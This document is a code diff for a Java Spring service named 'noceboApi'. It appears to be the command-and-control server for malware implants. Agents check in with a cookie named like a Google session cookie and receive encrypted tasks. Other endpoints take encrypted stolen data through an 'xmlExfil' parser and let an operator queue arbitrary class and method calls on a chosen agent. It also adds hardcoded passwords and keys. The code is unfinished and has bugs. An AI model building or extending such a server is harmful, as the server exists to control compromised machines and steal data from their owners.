@@ -59,6 +59,7 @@ class noceboApi
 	static class endpointConfig
 	{
 		static String passwd = "T__+Pmv.REW=u9iXBB-";
+		static String userpass = "SiAp++Em=@vBnQo0_";
 		static String encKey = "A54f6YY2_1@31395b5v5+9592_4081l0";
 		static Hashtable<String,session> sessionTable = new Hashtable();
 	}
@@ -70,7 +71,7 @@ class noceboApi
 		
 
 		@PostMapping("/60000")
-		String auth(@RequestBody noceboApiRequest requestData, @CookieValue("__Secure-3PSIDCC") String authCookie, @CookieValue("uuid") String idCookie) throws NoSuchAlgorithmException, IOException
+		String auth(@RequestBody noceboApiRequest requestData, @CookieValue("__Secure-3PSIDCC") String authCookie, @CookieValue("uuid") String idCookie) throws Exception, NoSuchAlgorithmException, IOException, ParserConfigurationException, SAXException, InvalidKeyException, InvalidAlgorithmParameterException, IllegalBlockSizeException, BadPaddingException
 		{
 			session sessionData;
 
@@ -90,13 +91,14 @@ class noceboApi
 			//validate auth first
 			if (!napi.validAuth(xmlParsed))
 			{
-				return "n/a";	
+				return "nah";	
 			}
 
 			if (!epc.sessionTable.keySet().contains(idCookie))
 			{
 				sessionData = new session();
 				sessionData.nonce = nonce;
+				sessionData.tasks.add(napi.mkTask("autoApi","metadata",new String[]{}));
 				epc.sessionTable.put(idCookie, sessionData);
 			}
 
@@ -106,38 +108,84 @@ class noceboApi
 			sessionData.encKey = napi.strand(32);
 			sessionData.nonce =  napi.strand(12);
 			sessionData.lastSeen = new SimpleDateFormat("yyyy.MM.dd.HH.mm.ss").format(new java.util.Date());
-			sessionData.tasks.add(napi.mkTask("autoApi","metadata",new String[]{}));
+
 
 			epc.sessionTable.put(idCookie,sessionData);
 
-			return napi.xmlDocToString(napi.outputToXmlDoc(sessionData.cookie, sessionData.encKey, sessionData.nonce, sessionData.tasks))
+			return napi.xmlDocToString(napi.outputToXmlDoc(sessionData.cookie, sessionData.encKey, sessionData.nonce, sessionData.tasks));
 		}
 
 		@PostMapping("/60001")
-		String data(@RequestBody noceboApiRequest requestData, @CookieValue("__Secure-3PSIDCC") String authCookie, @CookieValue("uuid") String idCookie)
+		String data(@RequestBody noceboApiRequest requestData, @CookieValue("__Secure-3PSIDCC") String authCookie, @CookieValue("uuid") String idCookie) throws Exception, NoSuchAlgorithmException, IOException, ParserConfigurationException, SAXException, InvalidKeyException, InvalidAlgorithmParameterException, IllegalBlockSizeException, BadPaddingException
 		{
-			if (!epc.sessionTable.keySet().contains(idCookie) || authCookie != )
+			session sessionData;
+
+			if (!epc.sessionTable.keySet().contains(idCookie))
 			{
-				return "n/a";
+				return "nah";
 			}
+			else
+			{
+				sessionData  = (session) epc.sessionTable.get(idCookie);
+				if (sessionData.cookie != authCookie)
+				{
+					return "nah";
+				}
+			}
+			
+			Hashtable xmlParsed = napi.xmlExfilToHashtable(
+				new String(
+					sapi.decrypt(
+						Base64.getDecoder().decode(
+							requestData.data
+						), 
+						sessionData.nonce.getBytes(),
+						epc.encKey
+					)
+				)
+			);
+			
+			sessionData.data.add(xmlParsed);
 
-			session sessionData = (session) epc.sessionTable.get(idCookie);
-
-
+			return "ok";
 		}
 
 		@PostMapping("/tasking")
-		String ctrl(@RequestBody noceboApiRequest requestData)
+		String ctrl(@RequestBody noceboApiCommand requestData, @CookieValue("nocebo.auth") String authCookie) throws IOException
 		{
 			//put authenticator in front
+			if (!epc.sessionTable.keySet().contains(requestData.uuid))
+			{
+				return "Fatal Error: Invalid session uuid. Agent associated with session ID is most likely dead.";
+			}
+
+			session sessionData = (session) epc.sessionTable.get(requestData.uuid);
+
+			Hashtable newTask = napi.mkTask(
+				requestData.className,
+				requestData.methodName,
+				requestData.args.split(",")
+			);
+
+			sessionData.tasks.add(
+				newTask
+			);
+
+			return String.format("Successfully added task: %s", newTask.toString());
 		}
 
 		@RequestMapping("/log")
-		String log(@RequestBody noceboApiRequest requestData)
+		String log(@RequestBody noceboApiRequest requestData, @CookieValue("nocebo.auth") String authCookie)
 		{
 			//put authenticator in front
 			return epc.sessionTable.toString();
 		}
+
+		//@RequestMapping("/auth")
+		//String auth(@RequestBody noceboApiRequest requestData)
+		//{
+
+		//}
 
 	}
 
@@ -153,6 +201,8 @@ class noceboApi
 
 	class noceboApiRequest
 	{
+		static ArrayList<noceboApiRequest> Data = new ArrayList<noceboApiRequest>();
+
 		String data;
 		noceboApiRequest(String data)
 		{
@@ -160,11 +210,29 @@ class noceboApi
 		}
 	}
 
+	class noceboApiCommand
+	{
+		static ArrayList<noceboApiCommand> Data = new ArrayList<noceboApiCommand>();
+
+		String className;
+		String methodName;
+		String args;
+		String uuid;
+
+		noceboApiCommand(String className, String methodName, String args, String uuid)
+		{
+			this.className = className;
+			this.methodName = methodName;
+			this.args = args;
+			this.uuid = uuid;
+		}
+	}
+
 	static class noceboApiUtil
 	{
 		public boolean validAuth(Hashtable authData) throws ParserConfigurationException, IOException, SAXException
 		{
-			String authKey = xmlParsed.get("aKey").toString();
+			String authKey = authData.get("aKey").toString();
 			if (authKey == epc.passwd)
 			{
 				return true;
